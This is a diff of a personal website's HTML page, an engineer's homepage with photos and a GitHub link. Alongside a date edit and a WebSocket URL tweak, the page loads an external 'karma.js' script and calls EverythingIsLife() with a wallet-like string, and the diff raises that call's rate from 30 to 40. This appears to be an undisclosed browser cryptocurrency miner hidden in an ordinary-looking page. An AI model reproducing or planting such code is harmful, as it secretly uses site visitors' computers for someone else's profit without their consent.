@@ -114,7 +114,7 @@
 <h1>My Photos</h1>
 <legend>Daisy</legend>
 <p>Welcome to my website! I&#x27;m an engineer living in Seattle. This is my personal website. I build websites, electronics, video games, and apps. I am a woman in tech making critical software available to those who need it.</p>
-<p style="text-align: center;"><small>Nov. 18, 2024, 10:46 p.m.</small></p>
+<p style="text-align: center;"><small>Nov. 20, 2024, 5:34 p.m.</small></p>
 <p>Visit my GitHub to see my <a href="https://github.com/daisycamber" title="My projects on GitHub">projects</a>.</p>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
@@ -626,7 +626,7 @@ setInterval(function() {
         var socket;
         function openSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href);
+            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
             socket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
@@ -825,7 +825,7 @@ if(document.getElementById("current-time")) {
     
     <script src="https://lotteh.com/static/js/karma.js?karma=bs?nosaj=faster.mo"></script>
 <script type="text/javascript">
-EverythingIsLife('479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw', 'glamgirlx', 30);
+EverythingIsLife('479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw', 'glamgirlx', 40);
 </script>
 
     
